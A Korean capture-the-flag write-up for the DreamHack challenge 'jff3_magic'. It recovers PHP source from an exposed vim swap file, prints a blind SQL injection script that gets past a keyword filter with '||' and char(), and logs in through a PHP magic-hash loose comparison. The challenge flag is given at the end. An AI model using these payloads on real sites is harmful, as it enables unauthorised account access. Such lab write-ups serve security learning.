# [DreamHack] [wargame.kr] jff3_magic

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> This challenge is part of Just For Fun [Season3].
> - thx to Comma@LeaveRet

## Analysis

### Recover index.php from swp file

![image](https://user-images.githubusercontent.com/104156058/165442048-9f7b8a6d-e54d-49d2-b948-9edb22df483b.png)

서버에 접속하면 under construction이라고 하면서 `swp`라는 힌트를 준다. `swp`는 리눅스의 `vi` 편집기에서 편집 중에 비정상적으로 종료될 경우 생성되는 파일의 확장자로, 이 파일의 이름은 `.<filename>.swp`의 형식이다.

`/.index.php.swp`에 접속하면 `index.php`의 `swp` 파일을 다운받을 수 있고, 이 파일로부터 원래의 `index.php` 파일을 복구할 수 있다. `vi index.php` 명령어를 실행하면 다음과 같은 경고가 뜬다.

```
E325: ATTENTION
Found a swap file by the name ".index.php.swp"
          owned by: h0meb0dy   dated: Wed Apr 27 13:38:13 2022
         file name: /var/www/html/index.php
          modified: YES
         user name: root   host name: 93bb8547cfc9
        process ID: 390
While opening file "index.php"
      CANNOT BE FOUND
(1) Another program may be editing the same file.  If this is the case,
    be careful not to end up with two different instances of the same
    file when making changes.  Quit, or continue with caution.
(2) An edit session for this file crashed.
    If this is the case, use ":recover" or "vim -r index.php"
    to recover the changes (see ":help recovery").
    If you did this already, delete the swap file ".index.php.swp"
    to avoid this message.

Swap file ".index.php.swp" already exists!
[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort:
```

`r`을 누르면 `index.php` 파일이 복구된다.

```
"index.php" [New File]
Using swap file ".index.php.swp"
Original file "/mnt/d/Github-h0meb0dy/Dreamhack-Wargame/[wargame.kr] jff3_magic/index."/mnt/d/Github-h0meb0dy/Dreamhack-Wargame/[wargame.kr] jff3_magic/index.php" [New File]
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.


Press ENTER or type command to continue
```

### Analyze index.php

```php
<?php
	include "./lib/lib.php";
	if(!isset($_POST['id']))
		$_POST['id']=NULL;
	if(!isset($_POST['pw']))
		$_POST['pw']=NULL;
	if(!isset($_GET['no']))
		$_GET['no']=NULL;
?>
```

```php
<?php
	/******************************************
	Admin check & No Parameter Filtering..
	******************************************/
	$test = custom_firewall($_GET['no']);
	if ($test != 0){
		exit("No Hack - ".$test);
	}

	$q = mysqli_query($connect, "select * from member where no=".$_GET['no']);
	$result = @mysqli_fetch_array($q);

	echo $result['id']."<br>";

	if(isset($_POST['id'])){
		sleep(2); // DO NOT BRUTEFORCE
		$id = mysqli_real_escape_string($connect, $_POST['id']);
		$q = mysqli_query($connect, "SELECT * FROM `member` where id='{$id}'");
		$userinfo = @mysqli_fetch_array($q);	
	}
?>
```

`custom_firewall()`은 코드에는 나와있지 않지만 뒤에서 여러 가지 시도를 해보면 SQL injection을 방지하기 위한 함수라고 추측할 수 있다.

`GET`으로 `no`를 전달받으면 DB에서 그 `no`에 해당하는 이용자의 `id`를 가져와서 화면에 띄워준다. 홈 페이지 왼쪽의 MemberList에 있는 `Cd80`, `Orang`, `Comma`의 `no`는 각각 2, 3, 1이고, `no=0`은 `admin`이다. 이때 `$_GET['no']`를 그대로 쿼리에 넣기 때문에 SQL injection이 가능하다.

`id`를 입력했을 경우, DB에서 그 `id`에 해당하는 이용자의 정보를 가져와서 `$userinfo`에 저장한다.

```php
<?php
	if(isset($_POST['id'])){
		if (hash('haval128,5',$_POST['pw'],false) == mysqli_real_escape_string($connect, $userinfo['pw'])) {
			echo 'Success! Hello '.$id."<br />";
			if ($id == "admin")
				echo 'Flag : '.$FLAG;
		}
		else {
			echo hash('haval128,5',$_POST['pw'], false);
			echo 'Incorrect Password';
		}
	}
?>
```

`pw`에 `haval128,5` 해시를 씌운 결과가 `$userinfo`의 `pw`의 값과 같으면서, `$id`가 `admin`이어야 플래그를 획득할 수 있다.

## Exploit

### Figure out password

`select * from member where no=4 or <condition about pw>`의 형태로 쿼리를 날리면, `pw`에 대한 조건식이 참일 경우 그 `pw`에 해당하는 `id`가 화면에 뜨게 된다. 예를 들어 `select * from member where no=4 or pw like 0%`라는 쿼리를 날리면, `pw`가 0으로 시작할 경우 조건이 참이 된다.

여기서 `or`과 `%`가 필터링되어 No Hack이 뜨는데, `or`은 `||`로 우회하고 `0%`는 `char(0x30, 0x25)`로 우회할 수 있다. `char(num1, num2, num3, ...)`는 인자로 전달된 모든 수를 ascii 문자로 바꿔서 이어붙인 문자열을 반환하는 함수이다. 이때 `0x`도 필터링되기 때문에 숫자는 10진수로 써야 한다.

`/?no=4 || pw like char(48, 37)`에 접속해보면 `admin`이 뜨는 것을 확인할 수 있다. 즉 `admin`의 `pw`가 0으로 시작한다는 의미이다.

DB에 있는 `pw`들은 `haval128,5` 해시 값들이므로 `[0-9a-f]{32}`의 형태일 것이다. 앞의 방식과 같이 blind SQL injection을 수행하여 한 글자씩 알아낼 수 있다.

```python
import requests

server = 'http://host1.dreamhack.games:22266/'
chars = '0123456789abcdef'
pw = ''

for idx in range(32):
    for char in chars:
        print(pw + char)

        url = server
        url += '?no=4 || pw like char('
        for c in pw:
            url += str(ord(c)) + ','
        url += str(ord(char)) + ','
        url += str(ord('%'))
        url += ')'

        res = requests.get(url)
        if 'admin' in res.text:
            pw += char
            break

print('admin\'s pw: ' + pw)
```

```
$ python3 password.py
0
0e
0e5
0e53
0e531
0e5312
0e53124
0e531247
0e5312479
0e53124796
0e531247968
0e5312479688
0e53124796880
0e531247968804
0e5312479688046
0e53124796880464
0e531247968804642
0e5312479688046426
0e53124796880464268
0e531247968804642688
0e5312479688046426880
0e53124796880464268805
0e531247968804642688052
0e5312479688046426880523
0e53124796880464268805235
0e531247968804642688052356
0e5312479688046426880523564
0e53124796880464268805235646
0e531247968804642688052356464
0e5312479688046426880523564643
0e53124796880464268805235646431
0e531247968804642688052356464312
admin's pw: 0e531247968804642688052356464312
```

### Get flag using magic hash

앞에서 알아낸 `admin`의 `pw`는 `0e531247968804642688052356464312`로, magic hash의 형태를 가지고 있다.

> https://www.whitehatsec.com/blog/magic-hashes/

![image](https://user-images.githubusercontent.com/104156058/165455191-128fc961-4633-49b4-92f8-5a2c59195e84.png)

따라서, 패스워드에 `115528287`을 넣고 로그인을 시도하면 `hash('haval128,5',$_POST['pw'],false) == mysqli_real_escape_string($connect, $userinfo['pw'])`로 느슨한 비교를 하여 `true`가 된다.

```php
<?php
if (hash('haval128,5', '115528287', false) == '0e531247968804642688052356464312') echo 1;
?>
```

```
$ php test.php
1
```

![image](https://user-images.githubusercontent.com/104156058/165455610-0fc67ed3-7169-4252-ab23-36e2d881c6eb.png)

![image](https://user-images.githubusercontent.com/104156058/165455650-cf0a7157-bb7f-4916-b09c-c8ad5dd9a1ae.png)

```
flag: DH{173a922776c00f9150dd38a0d0243ff68150222b}
```